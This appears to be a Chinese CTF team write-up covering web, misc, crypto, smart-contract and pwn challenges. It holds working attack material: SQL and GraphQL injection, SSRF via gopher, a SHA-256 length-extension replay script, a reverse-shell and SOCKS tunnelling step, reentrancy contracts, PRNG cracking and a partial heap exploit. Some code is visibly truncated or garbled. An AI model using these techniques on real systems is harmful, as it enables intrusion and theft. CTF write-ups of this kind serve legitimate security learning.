VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#` 11.用 1' or '1'='1访问一下。 `/?inject=1%27+or+%271%27%3D%271# /?inject=1' or '1'='1 Flag 到手~ 智能门锁 admin-琴里提供(转自某大佬WP) 官网打开后是一个智能门锁的官方网站，查看源代码后发现了两个可以访问的地址，一个是https://factory.ctf.aoicloud.com/demo目录，另一个是https://school.ctf.aoicloud.com/。 根据官网介绍，demo子目录下的站点似乎是管理后台的一个演示版，使用下面给出的admin，admin用户名密码进入后台。 注意到后台首页有一个动态获取公告的接口，经过测试是使用curl直接获取get参数url内的地址，同时具有ssrf漏洞，使用file协议可以获得网站的所有源码。 公告内提供了一个V2.firm文件的下载地址，下载下来后查看文件头发现是zip压缩包，解压后获得一个hex格式的文件。 school域名下的网站无法直接访问，检查demo源码可知，所谓的waf只是判断client ip这个HTTP头内的IP作为访客IP，通过在请求中添加Client-IP头为192.168.1.1伪造来源IP即可正常访问 测试发现使用guest账户登录至学校后台，学校后台的公告内多一条维修记录，并且包含一个pcap抓包文件。 尝试发现，官网固件有v1和v2两个版本，结合官网公告，推测v2是新固件，v1是老固件。 使用IDA打开固件进行逆向分析。固件是Atmega128程序，首先分析V2固件。 根据__RESET部分代码可知，门锁运行后会进行内存初始化，静态区的数据会从固件地址0x1636处开始加载，内存的起始地址为0x0100。 sub_06E会使用位于内存0x0372处的一个uint8变量统计访问次数，每次访问会将其增加1，该变量也会作为下标，访问位于内存0x031A处的一个数组，该数组的初始值为“get and set timestamp not implement”，出题人在此处告知我们获取和设置时间戳的部分并没有真正实现。 这个函数在返回前接着读取了位于内存0x0373-0x0376的变量uint32，将其与上方提示数组取出的一个值相加得到最终的返回值。 sub_065函数内将一个uint32类型的参数直接存入0x0373-0x0376，函数无返回值，结合出题人的hint推测出sub_06E是用于读取门锁时间戳的函数，sub_065是设置时间戳的函数。 sub_08D的功能是将0x0373-0x0376部分内存全部置0，猜测此函数为初始化门锁系统时钟的函数。 sub_096函数初始化了atmega128单片机A组IO口的模式，A0和A1被设置为了输出口。由于整个固件没有涉及到其它的通用io口，猜测A0和A1可能和控制门锁有关系，该函数的用途为初始化控制门锁的IO口。 sub_09A内印证了以上的推测，该函数根据调用参数（R24）的值设置io口A0的电平状态。猜测是控制门锁的函数。 sub_0A0与sub_06E（set_clock）比较相似，但它访问的数组的起始地址是0x033E，该数组的初始值为” get random function not implement”。出题人在此处提示我们产生随机数的函数也没有具体代码实现，因此该函数本身含义应该是产生一段随机序列，该函数会往第一个参数指向的内存区域复制复制一段随机字节序列，长度由第二个参数给出，原型应当为get_random(uint8_t *dst, uint8_t size)。 sub_06B函数内无退出代码，并且函数开头调用了多个初始化函数，因此该函数应该为main函数。 函数sub_2C9，sub_2D3，sub_2D7，sub_2DB均为uart有直接联系，结合具体汇编指令，以上四个函数分别命名为init_uart_sub，uart_read，uart_write，init_uart。 结合gcc-avr使用的链接库libc.a对比分析可知，固件内sub_9E2和sub_A7A分别为malloc和free。 根据main函数大循环内的逻辑与执行流程可以推断出，sub_1EB的功能应当为释放数据包对象。sub_19E则为初始化数据包对象。数据包对象在源代码中应当为一个结构体。数据包结构体结构应当如下形式： struct Packet { uint8_t packet[38] uint8_t extenstion_length uint8_t *extension } 数据包结构体的长度为41个字节，其中前38字节是每个数据包均包含的部分。第39字节似乎为后面扩展部分的长度，而最后两个字节则是一个指针，extension指针指向的内存长度由extension_length提供。 数据包对象在初始化时并不为extension部分申请内存，而前38字节则固定存在，因此猜测这38字节应当为数据包的包头。而extension部分则为数据包的扩展部分。 sub_1FE内设置了数据包包头的第34-37字节，设置的值是由get_timestamp函数提供的，因此该函数功能应该是封装数据包时设置数据包内的时间戳。 同时注意到设置时间戳前对时间戳进行了字节序调整处理，转换为了大序端，因此数据包内的时间戳应该是以大序端保存的。 sub_20A内会将数据包的第38字节修改为参数，根据后面的分析可知，该字段为数据包类型字段，因此该函数用途为封装数据包时设置数据包类型。 sub_20D会对数据包结构体的第39-41字节进行处理。功能是将参数src指向的内存复制n个字节到数据包的extension部分。 sub_2DC函数会从uart中读取数据，uart中读取的首字节为数据的长度，随后会使用malloc分配该长度的缓冲区，依次读取。 该函数的后半段会构造一个数据包，前38字节直接填充进入Packet结构体的包头部分。 随后对检查数据包长度，当长度大于38字节时，数据包的后续部分被填充进入Packet中的extension部分。 sub_2FE会将数据包的内容依次通过uart发送出去，在发送数据包之前会计算并发送一个长度。 在sub_787内发现了8个熟悉的立即数，0x6A09E667，0xBB67AE85……，这些数字为sha256算法的初始哈希值，很显然这个函数是完成sha256计算前的初始化工作。 在函数sub_234和函数sub_277中，均调用了上述的sha256_init，猜测这两个函数会执行sha256计算操作，根据后面对main函数的分析可知，这两个函数一个用于数据包签名，一个用于检查数据包签名。这两个函数内均在sha256_init后多次调用sub_7E0，并且传递相同的参数（R28:29），同时，在完成sub_7E0最后一次调用后均使用同一参数（R28:29）调用了函数sub_854，在sub_7E0和sub_854内均调用函数sub_327对传入的数据进行处理，因此sub_327应为进行sha256变换的关键函数（sha256_transform）。 sub_7E0会在缓冲区内长度满足0x40即64字节时调用sha256_transform，正好是sha256计算时的一个块大小。否则只是将传入参数内的数据复制进入缓冲区，不执行变换。因此该函数应当进行的是sha256_update的操作。 sub_854（sha256_final）是sha256计算时的最后一步，函数内实现了对消息的填充，并最终调用sha256_transform完成sha256计算。 函数sub_234和函数sub_277的前一部分完全相同，但sub_277在sha256_final完成sha256计算后多调用了一个函数sub_B03，这是一段比较内存值的代码，即memcmp。比较数据包的签名字段与数据包的签名是否相同。 通过该函数可以推出，数据包的签名位于第1-33字节，签名的计算方法为 sign=sha256(???+packet_header+packet_extension) ???为传递给签名函数的第二个参数，根据main函数的分析可知为签名密钥。 至此基本函数分析完毕，下面分析main函数的内部逻辑与执行流程。 main函数首先进行了门锁，时间戳和UART的初始化，然后开始了一个死循环。 循环体的一开头使用函数从uart上接收到了一个数据包。 首先检查数据包的第一个字节，根据上下文可知，数据包首字节必须为0x02，结合题目描述，推测此字节为协议的版本标记 随后跳过前0x25即第38字节偏移处，检查该字节是否为0，注意到后面有多处检测该字节值的判断，根据该字节的值执行了不同的操作，推测该字节为数据包操作类型标记。 当数据包类型为0时，检查了一个全局的变量，在第一次执行后，该变量被设置为0x01，在满足执行条件时对内存地址为0x2A0处进行数据了16字节的内存复制，源地址为数据包的结构体的第39字节？根据后面对数据包结构体的逆向分析可知，此处是数据包额外的payload部分。 当数据包类型为0x12时，会创建一个响应数据包，数据包类型为0x13，同时调用get_random()，此函数使用栈进行数据返回，执行后随机数被复制进一个4字节的全局变量内，内存地址为0x206，后面可看到改随机数会在处理同步数据包时进行检查。 同时，这个随机数被作为参数传递给packet_append_data，作为返回数据返回给请求方。 当数据类型不为0x00和0x12时，会进行数据包签名校验和数据包时间戳检查，根据此处得到时间戳位于数据包的33-37字节，要求数据包的时间戳与门锁的系统时间戳误差小于5 完成数据包签名和时间戳检查后，会继续判断数据包类型。当类型为0x10时，会将数据包payload 内第二个字段与内存地址为0x206的内存进行比较，即比较比较0x12数据包时全局保存的四字节随机数。 随机数验证通过后，会执行时间戳更新和一段不知用途的内存复制 内存复制的源地址为数据包payload部分第二字节，长度由payload第一字节提供。 时间戳由数据包的33-37字节时间戳字段提供。目标地址为0x106，出题人提醒该内存缓冲区为屏幕显示的内容，会在时间同步时更新（“This is the message displayed on screen. It will get synchronized while time synchronization”）与我们当前的分析相符。 0x10的响应包类型为0x11，payload为空。 当数据包类型为0x20时，会检查数据包结构体内payload 的整体长度要求必须为2 当数据包payload长度为2时，就会根据payload第二字节的内容控制门锁，0xf0会将端口置为高电平，0x0f则置为低电平。 随后程序进行了内存复制，将起始内存地址为0x260，长度17字节，该段内存的初始值为字符串“flag will be here”，该字符串会作为门锁响应数据包的payload部分返回。因此只要我们能操纵门锁并接收响应的数据包即可获得flag。 分析得出的V2版本数据包格式为： 字段 长度 值或含义 version 1Byte(0) 0x02 sha256 sign 32Byte(1-32) 数据包签名 timestamp 4Byte(33-36) 时间戳 packet type 1Byte(37) 数据包类型 extension 变长 部分数据包拥有的额外数据 数据包的签名计算方法为： sign= sha256(key+timestamp+packet_type+payload) 数据包类型： 0x00，向门锁发送密钥设置，只可在开机时运行一次，成功后返回0x01,extension部分为空的数据包 0x10，同步数据包，根据固件内字符串初始值的提示可知该类型数据包用于设置屏幕显示字符和时间戳同步，门锁会使用接收到的数据包的timestamp字段更新系统时钟。设置成功后门锁会返回类型为0x11的数据包。该数据包内需要在ext字段携带一个由0x12请求获得的4字节随机数，否则门锁不会接受该数据包。 0x12，随机数请求数据包？向门锁发送该包会返回一个类型为0x13的数据包，响应数据包的ext[1:5]字段包含一个4字节的随机数，该随机数会在处理同步数据包（type=0x10）时进行检查。该数据包不检查签名与数据包的时间戳。 使用同样的方法和思路分析v1版本固件，可以发现v1，v2版的数据包格式和签名计算方法完全相同。数据包格式和extension部分内容略有区别。 0x00，向门锁发送密钥设置，只可在开机时运行一次，成功后返回0x01,extension部分为空的数据包 0x10，同步数据包，extension部分为空，门锁仅检查数据包签名，不再检查时间戳，一旦签名验证通过，则使用数据包的timestamp字段修改自身系统时间。成功后返回0x11数据包，extension也为空。由于没有任何交互验证过程，若能在链路上窃取到数据包，则可以使用数据包重放攻击篡改系统时间。 0x20，门锁控制包，extension部分为操作，0x01f0为开锁，成功后返回0x20数据包。 通过pcap文件，我们可以得到v1版本的时间同步包和timestamp为同步时间的开锁包。 解题思路 学校管理后台内下载到的抓包文件可以获得10.2.3.103门锁的管理端口为2333，使用TCP通信，根据发送数据和响应数据发现文件内只提供了version字段为1的数据包。 由于门锁位于内网，尝试使用学校管理后台的get_info.php进行ssrf攻击，使用gopher协议向门锁发送TCP请求。 首先尝试对门锁重放版本1的数据包，门锁均无返回且立即断开了连接。 考虑到官方提示中的“门锁固件升级“，猜测门锁已升级至V2版固件，由于V2版固件内只有类型为0x00和0x12的数据包不会检查签名和时间戳，尝试构造V2版数据包向门锁发送。 经测试发现，门锁不响应0x00数据包，说明门锁已经被设置签名密钥，不能通过篡改签名密钥实施开锁。 但0x12数据包成功返回了一个随机数，同时考虑到v1版本和v2版本开门的请求数据包格式是完全相同的，只有开头的版本号不同，若能篡改门锁的时间戳即可尝试使用抓包文件内获取到的开门数据包进行重放攻击。 根据逆向得知数据包的签名方法可以发现，该签名方法存在哈希长度扩展攻击漏洞。 pacp文件内开门数据包前正好存在一个v1版本的时间同步数据包，v1版本的时间同步包不包含extension字段，对其做sha256长度扩展攻击可构造一个存放于extension字段的payload，其首字节因为原sha256计算扩展时填充的0x80，末尾为用于门锁验证用的随机数。 重置服务器时间戳后立即重放提取自pcap文件内修改版本号的开锁数据包 攻击脚本如下： import socket import hashpumpy import requests class Tester: def send_curl(self, packet): packet = len(packet).to_bytes(1, 'big') + packet packet_url = \"%\" + \"%\".join([\"%02X\" % x for x in packet]) url = \"https://school.ctf.aoicloud.com/get_info.php\" ret = requests.get(url, headers={ 'client-ip': '192.168.1.1', 'cookie': 'PHPSESSID= }, params={ 'url': \"gopher://10.2.3.103:2333/_\" + packet_url }) return ret.content[1:] def main(): tester = Tester() packet = b'\\x02' + b'\\xff' * 32 + b'\\x00' * 4 + b'\\x12' ret = tester.send_curl(packet) rand = ret[39:43] print('rand:', rand, int.from_bytes(rand, 'big')) # 对1版本的数据包做hash长度扩展攻击，篡改门锁时间 # 2601c8f0ec78f53927540fb72fb8475eab29fe451add68851ad0bc3b6c21050c9bc85ccbdad110 # 已有的padding能提供64-16-5-1=42字节的内容，剩下的需要追加128-34=94字节的padding attack = hashpumpy.hashpump('C8F0EC78F53927540FB72FB8475EAB29FE451ADD68851AD0BC3B6C21050C9BC8', bytes.fromhex('5ccbdad110'), b'\\x00'*(128-42)+b'\\x04'+rand, 16) # attack = hashpumpy.hashpump(known[1:33], known[33:], b'\\x00' * 94 + b'\\x04' + rand, 16) print(attack) sign = attack[0] packet = b'\\x02' + bytes.fromhex(attack[0]) + attack[1] print(packet) ret = tester.send_curl(packet) # # 开门数据包，修改版本号后原样发送即可 # #280170c896bb5aa844f848cdee8c0542bf438d3c8aa7e43bd09ce4e4351db000e7ff5ccbdad22001f0 ret = tester.send_curl(bytes.fromhex('0270c896bb5aa844f848cdee8c0542bf438d3c8aa7e43bd09ce4e4351db000e7ff5ccbdad22001f0')) print(\"ret:\", ret) if __name__ == '__main__': main() 运行后即可得到flag babywebbb **一开始这题都摸不着门路，枯了…… 然后day2中午的时候，队友告诉我存在证书泄漏 找到 域名绑定到hosts，就可以访问了，后来才知道,本题nginx做代理时，是与域名绑定的。 结合一开始发现的rsync的未授权访问获取的源码 有一个graphQL的API服务存在注入 通过注入获取session后，进一步ssrf 注入+SSRF脚本 login = \"https://qqwwwwbbbbb.52dandan.xyz:8088/graphql_test123/login?query=%7B%0A%20%20recv%20(%0A%20%20%20%20data%3A%22%7B%5C%22operate%5C%22%3A%5C%22login%5C%22%2C%5C%22username%5C%22%3A%5C%22%5C%5C%5C%22or%202%3D2%23%5C%22%2C%5C%22password%5C%22%3A%5C%22%5C%22%7D%22%0A%20%20)%0A%7D\" s = requests.Session() r = s.get(login,verify=False) ssrf = \"https://qqwwwwbbbbb.52dandan.xyz:8088/user/newimg\" data = { \"newurl\":sys.argv[1] } r = s.post(ssrf,verify=False,data=data,timeout=5) print(base64.b64decode(r.content)) 可以发现发现 存在uwsgi 用uwsgi的命令执行脚本进行修改，将gopher语句输出后，通过ssrf打127.0.0.1:3031 成功反弹shell 根据提示socks5，通过扫描发现172.16.17.4开发1080端口。在内网机器上使用ew进行代理 ./ew_for_linux64 -s lcx_slave -d 0.0.0.0 -e 4000 -f 172.16.17.4 -g 1080 自己的公网服务器执行 ./ew_for_linux64 -s lcx_listen -l 1089 -e 4000 通过反代出来的socks5进内网 代码审计给出的代码https://paste.ubuntu.com/p/q4xJBfm3Bb/ 回溯func waf log记录数据 存在任意文件写 回溯saveall 同时session类里有调用了pickle.load，因此存在反序列化 题目又关了 因此可能的执行流程为（讲道理应该可以，测试不了了233333 构造反序列化payload User 1 -> POST /adduser username=payload&password= User 1 -> /savelog 修改 User2 session User 2 -> 登录触发反序列化 User 2 -> getflag** MISC 签到 鲲or鳗orGame 两首歌（鸡你太美，大碗宽面还挺好听），一个游戏 题目说选一个，二首歌一个游戏，那先选游戏把 想把游戏直接通关，但是网页好像不太好操作 看看游戏页面源码 试试能不能直接看js目录，是可以的，搜索有用信息 mobile.js里看到 game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是GAMEBOY文件 下了个模拟器运行游戏，然后百度都会有说金手指，模拟器 查查就是个修改器之类的，但这个模拟器里的不太会用，想着改数值，但这里好像只能插入，换了一个 开始游戏（手残，基本只能过1个，所以卡了试了很久） 每次结束开金手指搜几次通过的个数 第一次：过一个 第二次：过两个 那就把两个地址的数值改到最大 FF 分别应用两个金手指，发现第一个，在开始到结束，结束的时候，就出了flag，但是一会就没了，还好手速快 强网先锋-打野 附件下载后直接通过zsteg解 Crypto Randomstudy 第一层，和服务器同步时间种子就可以了。 第二层，分析 SDK的 Random 函数。 随机数是以 seed0x5deece66d + 0xb &((1 循环的形式生成伪随机数的，只需要爆破得到低16位即可 就是 0-0xffff。 写脚本即可爆破，后来因为python 加了一个0xfffffff和脚本有点出入 可能有概率出不了解。懒得修改直接上。 import java.io.PrintStream; import java.util.Random; import java.util.concurrent.atomic.AtomicLong; public class test { public static long nextSeed(long seed){ return ((seed * 0x5DEECE66DL + 0xBL) & ((1L >> (48 - bits)); } public static void main(String[] paramArrayOfString) { long t1 = Long.parseLong(paramArrayOfString[0]); long t2 = Long.parseLong(paramArrayOfString[1]); for(int i=0; i第三层 套用randcrack即可 import hashlib import random import time import subprocess from randcrack import RandCrack from pwn import * def proof(skr, skr_sha256): for c1 in range(0x100): for c2 in range(0x100): for c3 in range(0x100): shr = skr + chr(c1)+ chr(c2)+ chr(c3) # print hashlib.sha256(shr).hexdigest() if hashlib.sha256(shr).hexdigest() == skr_sha256.strip().lower(): print shr.encode(\"hex\") return shr.encode(\"hex\") def one(p, t): random.seed(t) randintdata = str(random.randint(0,2**64)) print \"Try: \", randintdata p.sendline(randintdata) i = -10 time_num = 1 data = p.recvline() print data while \"fail\" in data: time_num += 1 random.seed(t + i) for x in range(time_num): randintdata = str(random.randint(0,2**64)) print \"Try: \", randintdata p.sendline(randintdata) i += 1 data = p.recvline() if i == 8: print \"attack fail!\" exit() def second(p, x1, x2): x1 = x1.strip() x2 = x2.strip() print x1,x2 o = subprocess.check_output([\"/usr/lib/jvm/jdk-12.0.1/bin/java\", \"test\", x1, x2]) while len(o.split('\\n')) == 1: p.sendline(\"1\") p.recv() print p.recvuntil(\"[-]\") data1 = p.recvuntil(\"\\n\").strip() p.recvuntil(\"[-]\") data2 = p.recvuntil(\"\\n\").strip() o = subprocess.check_output([\"/usr/lib/jvm/jdk-12.0.1/bin/java\", \"test\", data1, data2]) print \"output:\", o.split('\\n') p.sendline(o.split('\\n')[0]) p.recv() def third(p): rc = RandCrack() for i in range(624): p.sendline(\"1\") oneline = p.recvline() print i, int(oneline[10:-1]) this_num = int(oneline[10:-1]) rc.submit(this_num) p.recvuntil('[-]') this_num = rc.predict_randrange(0, 4294967295) p.sendline(str(this_num)) print p.recv() print p.recv() print p.recv() def attack(): p = remote(\"119.3.245.36\", 23456) p.recvuntil(\"hexdigest()=\") skr_sha256 = p.recvuntil(\"\\n\") p.recvuntil(\"('hex')=\") shr5 = p.recvuntil(\"\\n\").strip().decode(\"hex\") p.recv() p.sendline(proof(shr5, skr_sha256)) p.recv() p.sendline(\"bfdccbebf86687951f6d37b3e5a35fe1\") p.recv() p.recv() one(p, int(time.time())) # print p.recvuntil(\"[-]\") print p.recvuntil(\"[-]\") data1 = p.recvuntil(\"\\n\") p.recvuntil(\"[-]\") data2 = p.recvuntil(\"\\n\") second(p, data1, data2) print p.recv() p.recv() third(p) attack() BABYBANK 我们通过合约地址进行逆向得到合约的逆向代码(https://ethervm.io/decompile/) 由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。 且合约中存在两个关键变量：balance（余额）以及level（一种标记）。 在审计合约之后我们发现 profit函数：每个账户只允许调用一次，并发送钱包1 token； guess函数需要level值为1且调用后余额+1、leve+1 ； 而transfer函数满足必须balance与level同时为2才能调用，且调用后收款方余额变为2，且转账方余额变为0 ； withdraw函数表示取款，且合约会将以太币转给msg.sender。 然而漏洞点就在withdraw中。熟悉区块链的人都知道此处使用.call方法进行转账，而这种方法会调用收款方的fallback函数，从而引发重入攻击。 于是我们利用此来进行攻击。我们还看到withdraw中还存在如下方法： 当存在减法且没有判断时，我们就可以认定这里存在溢出，然而要满足溢出条件需要storage[temp2] 贴上攻击合约 contract hack{ babybank a; uint count = 0; event log(uint256); constructor(address b)public{ a = babybank(b); } function () public payable { if(count==2){ log(3); }else{ count = count + 1; a.withdraw(2); log(1); } } function getMoney() public payable{} function hacker() public{ a.withdraw(2); log(2); } function payforflag1(string md5ofteamtoken,string b64email) public{ a.payforflag(md5ofteamtoken,b64email); } function kill() { selfdestruct(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c); } } 1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。 2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。 3 当C有了2token便可以进行攻击，调用hacker函数即可。 PS：由于合约需要前四位为“b1b1”的账户，所以我们需要https://vanity-eth.tk/来生成相应的账户B。 调动成功后在邮箱收到flag babybet 给了部分合约代码 pragma solidity ^0.4.23; contract babybet { mapping(address => uint) public balance; mapping(address => uint) public status; address owner; //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough. //Gmail is ok. 163 and qq may have some problems. event sendflag(string md5ofteamtoken,string b64email); constructor()public{ owner = msg.sender; balance[msg.sender]=1000000; } //pay for flag function payforflag(string md5ofteamtoken,string b64email) public{ require(balance[msg.sender] >= 1000000); if (msg.sender!=owner){ balance[msg.sender]=0;} owner.transfer(address(this).balance); emit sendflag(md5ofteamtoken,b64email); } modifier onlyOwner(){ require(msg.sender == owner); _; } 逆向合约，得到关键函数：profit、bet、func_048F（转账函数）。 发现此问题相比上一道题利用方法更为简单。首先调用profit函数获得空投10 token。 之后进入bet函数，而bet函数有如下判断：首先余额要>=10 、status要小于2、传入的参数要与随机数相同，之后便会给与此账户1000代币，并将status改为2 。 于是我们的函数调用顺序为：创建新合约账户A，调用profit、预测随机数调用guess、调用转账函数汇总token。 合约要求代币要>1000000，所以上述薅羊毛过程需要重复1000次，并汇总到一个账户中。 具体合约如下： contract midContract { babybet target = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A); function process() public { target.profit(); bytes32 guess = block.blockhash(block.number - 0x01); uint guess1 = uint(guess) % 0x03; target.bet(guess1); } function transfer(address a, uint b) public{ // target.func_048F(a,b); bytes4 method = 0xf0d25268; target.call(method,a,b); selfdestruct(); } } contract hack { // babybet target; = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A); function ffff() public { for(int i=0;i每次生成新合约，循环20次，所以此合约执行50次即可。记得将gas limit调大。 预测十分简单，即使用一下语句即可 调用后拿到flag 强网先锋-辅助 由题意可知两个n有共同的素数，用辗转相除法求出这个素数p，在用n//p得到q即可根据rsa解密公式求出明文： Copperstudy Level0: 8字节的sha256，其中前五位已经知道，通过pwntools获得参数，爆破即可： Level1： 已知明文的前440位，后72位未知，用coppersmith算法得出m： M=90e1660dea565f39b970f85df641533cf27d868152c6e2580d116eefac0a08ee044f8d25b9542cc26ca4def66d40b8a3e1ad912e048470dcbc528a2865a3bfef Level2: 不知道p的后128位，仍然用coppersmith算法求出q： q=6604581748402653764201738484426147360096389094695544270124843986940937624534827121574193693349752286015841451817154565775829453708372553379990639392956781 然后n/q求出p，用rsa解密公式解密。 得到 m=218f49a4661f76005a17b92b5af29b648435c428d7548a8837a65c24ad6bfb8b556b065cd9d6d168c0cd2a5b36de0bc1f61298617bb370ebcab3f33d0d4c89bc Level3： 只知道d的后512位，还是用coppersmith算法求出q： 求出素数 q=11000650274751522370142078921978482877845511625699897790227407836720327411411182898531046988532756381187615879588960624645920464690947671950438982430030411 然后求出p和d，在根据rsa解密公式得到 M=bde78b37be9f24a23e33e966a0888aa9e32aeaa6c88b20b0b064a328207455cc53cc1ac68482f7249fb07739e514d240c7a509fe9b4fce901e0657086746fc50 Level4： 明显的广播攻击： 得到 M=c7dd93310ab23d76f670ae70b1d2b5558311c72a2ef78891d63f389c78a4914aa8697e43ef8b36295ef6ce2370b2a2eae6a11d2a5afb7dd3ebceeb15f39a4e29 Level5： 低加密指数。 c1-c2+k*n=3m\\^2+3m+1 m\\^2+m=(c1-c2+k*n-1)/3 4*m\\^2+4*m+1=4/3*(c1-c2+k*n-1)+1 爆破k使得4/3*(c1-c2+k*n-1)+1为平方数，然后根据k求出m： M=5747544acdf2b4c25b0dd659a48f1fb06748d92b7832e792a843653a4a04860c0d27d68af4c6ec338537a50b73b8295b1d9f9014434e0da6b62e258354a8b588 Level6: 高加密指数，但d稍大，不能使用wiener攻击，在这里使用boneh_durfee攻击： import time ############################################ # Config ########################################## \"\"\" Setting debug to true will display more informations about the lattice, the bounds, the vectors... \"\"\" debug = True \"\"\" Setting strict to true will stop the algorithm (and return (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound is usualy far away from actual results. That is why you should probably use `strict = False` \"\"\" strict = False \"\"\" This is experimental, but has provided remarkable results so far. It tries to reduce the lattice as much as it can while keeping its efficiency. I see no reason not to use this option, but if things don't work, you should try disabling it \"\"\" helpful_only = True dimension_min = 7 # stop removing if lattice reaches that dimension ############################################ # Functions ########################################## # display stats on helpful vectors def helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] >= modulus: nothelpful += 1 print nothelpful, \"/\", BB.dimensions()[0], \" vectors are not helpful\" # display matrix picture with 0 and X def matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = ('%02d ' % ii) for jj in range(BB.dimensions()[1]): a += '0' if BB[ii,jj] == 0 else 'X' if BB.dimensions()[0] = bound: a += '~' print a # tries to remove unhelpful vectors # we start at current = n-1 (last vector) def remove_unhelpful(BB, monomials, bound, current): # end of our recursive function if current == -1 or BB.dimensions()[0] = bound: affected_vectors = 0 affected_vector_index = 0 # let's check if it affects other vectors for jj in range(ii + 1, BB.dimensions()[0]): # if another vector is affected: # we increase the count if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # level:0 # if no other vectors end up affected # we remove it if affected_vectors == 0: print \"* removing unhelpful vector\", ii BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # level:1 # if just one was affected we check # if it is affecting someone else elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # if it is affecting even one vector # we give up on this one if BB[kk, affected_vector_index] != 0: affected_deeper = False # remove both it if no other vector was affected and # this helpful vector is not helpful enough # compared to our unhelpful one if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-shifts gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # x-shifts list of monomials monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() # y-shifts (selected by Herrman and May) for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # y-shifts list of monomials for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # construct lattice B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) # Prototype to reduce the lattice if helpful_only: # automatically remove BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # reset dimension nn = BB.dimensions()[0] if nn == 0: print \"failure\" return 0,0 # check if vectors are helpful if debug: helpful_vectors(BB, modulus^mm) # check if determinant is correctly bounded det = BB.det() bound = modulus^(mm*nn) if det >= bound: print \"We do not have det polynomials 1 & 2 if debug: print \"looking for independent vectors in the lattice\" found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # for i and j, create the two polynomials PR. = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # resultant PR. = PolynomialRing(ZZ) rr = pol1.resultant(pol2) # are these good polynomials? if rr.is_zero() or rr.monomials() == [1]: continue else: print \"found them, using vectors\", pol1_idx, \"and\", pol2_idx found_polynomials = True break if found_polynomials: break if not found_polynomials: print \"no independant vectors could be found. This should very rarely happen...\" return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print \"Your prediction (delta) is too small\" return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] # return solx, soly def example(): ############################################ # How To Use This Script ########################################## # # The problem to solve (edit the following values) # # the modulus N = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27 # the public exponent e = 0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb # the hypothesis on the private exponent (the theoretical maximum is 0.292) delta = .18 # this means that d = PolynomialRing(ZZ) A = int((N+1)/2) pol = 1 + x * (A + y) # # Find the solutions! # # Checking bounds if debug: print \"=== checking values ===\" print \"* delta:\", delta print \"* delta 0: print \"=== solution found ===\" if False: print \"x:\", solx print \"y:\", soly d = int(pol(solx, soly) / e) print \"private key found:\", d else: print \"=== no solution was found ===\" if debug: print(\"=== %s seconds ===\" % (time.time() - start_time)) if __name__ == \"__main__\": example() 得到 d=776765455081795377117377680209510234887230129318575063382634593357724998207571 求出 M=6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28 综上，得到flag: Pwn 强网先锋-AP 思路很清晰，在change处，可以溢出。 所有可以通过溢出泄露heap和putslibc地址，然后将putsaddr 换成 systemaddr，在堆块里用 /bin/sh，在show时getshgell，cat flag 如下 exp如下: from pwn import * context.log_level = \"debug\" context.os = \"linux\" context.arch = \"amd64\" # p = process(\"./task_main\") p = remote('117.78.60.139',30014) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(lenth,name): p.recvuntil('Choice >> \\n') p.sendline('1') 